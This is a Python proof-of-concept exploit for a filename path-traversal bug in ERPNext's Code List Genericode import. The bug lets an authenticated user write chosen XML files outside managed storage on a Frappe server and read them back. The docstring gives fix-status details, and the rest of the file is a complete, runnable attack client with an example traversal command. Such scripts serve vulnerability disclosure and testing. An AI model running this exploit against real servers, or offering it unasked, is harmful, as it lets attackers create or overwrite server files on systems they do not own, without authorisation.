#!/usr/bin/env python3
"""ERPNext Genericode filename traversal to arbitrary file write (FRAPPE-03).

ERPNext's Code List Genericode import (`import_genericode`) trusts the multipart
filename and passes it, with its `../` sequences intact, to Frappe's file-save
routine. An authenticated user who can import a Code List can therefore write
attacker-controlled XML to a path they choose outside managed storage, for
example into an installed app's `www` directory. Frappe's collision handling can
still rename the destination, and the import often returns HTTP 417 after the
write when later `File` validation rejects the escaped path.

This client uploads well-formed Genericode XML to `--remote-path` and can read it
back with `--retrieve-url`. Reviewed against Frappe 16.29.0 / ERPNext 16.30.0.

Fix status: Frappe 16.34.0 and 15.121.0 (PR #42847, 2026-09-15) confine
write_file() to the files directory, so the traversal now fails with "Invalid
file name". ERPNext still passes the raw multipart filename to save_file().
"""

from __future__ import annotations

import argparse
import sys
import urllib.parse
import xml.etree.ElementTree as ET
from pathlib import Path

from frappe_chain_common import (
    PocError,
    add_auth_arguments,
    add_color_argument,
    authenticated_client,
    bad,
    banner,
    disable_color,
    good,
    info,
    rule,
    upload_genericode,
    warn,
)


def validate_remote_path(remote_path: str) -> str:
    if not remote_path:
        raise PocError("--remote-path must not be empty")
    if '"' in remote_path or any(
        ord(char) < 0x20 or ord(char) == 0x7F for char in remote_path
    ):
        raise PocError("--remote-path must not contain quotes or control characters")
    return remote_path


def validate_genericode(content: bytes) -> None:
    try:
        root = ET.fromstring(content)
    except ET.ParseError as exc:
        raise PocError(f"payload is not well-formed XML: {exc}") from exc

    if root.tag.rsplit("}", 1)[-1] != "CodeList":
        raise PocError("Genericode payload root must be CodeList")

    required = {"ShortName", "Version", "CanonicalUri", "CanonicalVersionUri"}
    present = {
        element.tag.rsplit("}", 1)[-1]
        for element in root.iter()
        if isinstance(element.tag, str)
        and element.text is not None
        and element.text.strip()
    }
    if missing := sorted(required - present):
        raise PocError("Genericode payload is missing: " + ", ".join(missing))


def load_payload(args: argparse.Namespace) -> bytes:
    if args.xml is not None:
        content = args.xml.encode()
    elif args.xml_file == "-":
        content = sys.stdin.buffer.read()
    else:
        try:
            content = Path(args.xml_file).read_bytes()
        except OSError as exc:
            raise PocError(f"could not read --xml-file: {exc}") from exc
    if not content:
        raise PocError("Genericode payload must not be empty")
    validate_genericode(content)
    return content


def validate_retrieve_url(path: str | None) -> str | None:
    if path is None:
        return None
    parsed = urllib.parse.urlsplit(path)
    if (
        not path.startswith("/")
        or path.startswith("//")
        or parsed.scheme
        or parsed.netloc
        or parsed.fragment
    ):
        raise PocError("--retrieve-url must be a same-origin path beginning with /")
    return path


def show_response(label: str, status: int, body: bytes) -> None:
    """Diagnostic only: the HTTP status and response body go to stderr, so they
    never mix with the recovered file on stdout. The marker tracks the status so
    a failed response is not painted as a success."""
    marker = good if 200 <= status < 300 else warn
    marker(f"{label}: HTTP {status} ({len(body)} bytes)")
    if body:
        rule()
        sys.stderr.buffer.write(body if body.endswith(b"\n") else body + b"\n")
        sys.stderr.buffer.flush()


def emit_recovered(data: bytes) -> None:
    """The retrieved file is the stdout artifact, written verbatim (no added
    newline) so `--retrieve-url ... > file` is byte-exact."""
    good(f"recovered {len(data)} bytes from the written file")
    rule()
    sys.stdout.buffer.write(data)
    sys.stdout.buffer.flush()


def make_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description=__doc__,
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "example:\n"
            "  FRAPPE_POC_PASSWORD=pass %(prog)s --url https://frappe.example \\\n"
            "    --username sysmgr@example --remote-path '../../../../sites/assets/x.xml' \\\n"
            "    --xml-file payload.xml --retrieve-url /assets/x.xml\n\n"
            "WARNING: the selected server path may create or overwrite files writable\n"
            "by the Frappe worker. Frappe collision handling can instead choose a\n"
            "suffixed filename when a destination already exists."
        ),
    )
    parser.add_argument("--url", required=True, metavar="URL", help="Frappe/ERPNext site origin")
    add_auth_arguments(parser, "System Manager or Code List creator")
    parser.add_argument(
        "--remote-path",
        required=True,
        help="raw multipart filename and server-side destination",
    )
    payload = parser.add_mutually_exclusive_group(required=True)
    payload.add_argument(
        "--xml-file",
        metavar="PATH",
        help="valid Genericode XML file to upload unchanged; use - for stdin",
    )
    payload.add_argument(
        "--xml",
        help="valid Genericode XML supplied directly on the command line",
    )
    parser.add_argument(
        "--retrieve-url",
        metavar="PATH",
        help="same-origin URL path to request after the write and print verbatim",
    )
    parser.add_argument("--timeout", type=float, default=30.0, metavar="SECS", help="HTTP timeout (default: 30)")
    parser.add_argument("--insecure", action="store_true", help="disable TLS certificate verification")
    add_color_argument(parser)
    return parser


def run(args: argparse.Namespace) -> int:
    if args.no_color:
        disable_color()
    banner("ERPNext Genericode filename traversal  ·  FRAPPE-03")
    if args.timeout <= 0:
        raise PocError("--timeout must be greater than zero")
    remote_path = validate_remote_path(args.remote_path)
    retrieve_url = validate_retrieve_url(args.retrieve_url)
    payload = load_payload(args)
    client, csrf = authenticated_client(args)

    info(f"server-side destination: {remote_path}")
    info(f"uploading {len(payload)} attacker-supplied XML bytes")
    warn("the selected destination may create or overwrite server files")
    status, body = upload_genericode(client, csrf, remote_path, payload)
    show_response("Genericode import", status, body)
    if status not in {200, 201, 417}:
        raise PocError(f"Genericode import failed with HTTP {status}")
    if status == 417:
        warn(
            "HTTP 417 commonly follows the filesystem write when later File validation "
            "rejects the escaped path; the status alone does not prove the write"
        )

    if retrieve_url:
        info(f"reading the written file back through {retrieve_url}")
        read_status, actual = client.request(
            retrieve_url,
            headers={"Accept": "*/*", "Cache-Control": "no-cache, no-store"},
        )
        if read_status != 200:
            show_response(f"GET {retrieve_url}", read_status, actual)
            raise PocError(f"retrieval returned HTTP {read_status}")
        emit_recovered(actual)
    return 0


def main() -> int:
    try:
        return run(make_parser().parse_args())
    except PocError as exc:
        bad(str(exc))
        return 1
    except KeyboardInterrupt:
        bad("interrupted")
        return 130


if __name__ == "__main__":
    raise SystemExit(main())
